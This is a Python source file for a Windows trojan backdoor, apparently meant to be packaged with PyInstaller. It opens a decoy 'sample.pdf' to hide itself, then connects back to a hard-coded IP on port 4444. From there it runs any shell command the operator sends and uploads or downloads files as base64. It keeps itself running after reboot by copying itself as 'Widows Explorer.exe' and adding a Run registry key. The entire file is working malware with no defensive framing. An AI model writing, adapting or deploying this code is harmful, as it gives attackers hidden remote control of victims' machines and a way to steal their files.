#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:

	def __init__(self,ip,port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def reliable_send(self,data):
		json_data = json.dumps(data)		
		self.connection.send(json_data.encode())

	def	reliable_receive(self):
		json_data = b""
		while True:

			try:
				json_data +=  self.connection.recv(1024)
				return json.loads(json_data.decode())
			except ValueError:
				continue	
	def become_persistent(self):
		evil_file_location = os.environ["appdata"]+"\\Widows Explorer.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable,evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
	def read_file(self,path):
		with open(path,"rb") as file:
			 return base64.b64encode(file.read())

	def download_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+]file Upload successfull"		 
				
	def change_working_directory_to(self,path):
		os.chdir(path)
		return "[+] changin_working_directory_to" + path
			
	def execute_system_commands(self,command):
		DEVNULL = open(os.devnull,"wb")
		return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)

	def run(self):

		while True:
			retrun_data = self.reliable_receive()
			try:
				if retrun_data[0] == "exit":
					self.connection.close()
					sys.exit()

				elif retrun_data[0] == "download":
					send_command = self.read_file(retrun_data[1])

				elif retrun_data[0] == "cd" and len(retrun_data) > 1:			
					send_command = self.change_working_directory_to(retrun_data[1])

				elif retrun_data[0]=="upload":
					send_command = self.download_file(retrun_data[1],retrun_data[2])


				else:		
					send_command = self.execute_system_commands(retrun_data)
			except Exception:
				send_command ="[-] Error durring command execution msg from Backdoor"		
			try:
				self.reliable_send(send_command.decode())	
			except AttributeError:
				self.reliable_send(send_command)

file_name = sys._MEIPASS+"\sample.pdf"
subprocess.Popen(file_name,shell=True)

try:					
    my_backdoor = Backdoor("192.168.29.185",4444)
    my_backdoor.run()
except Exception:
    sys.exit()	
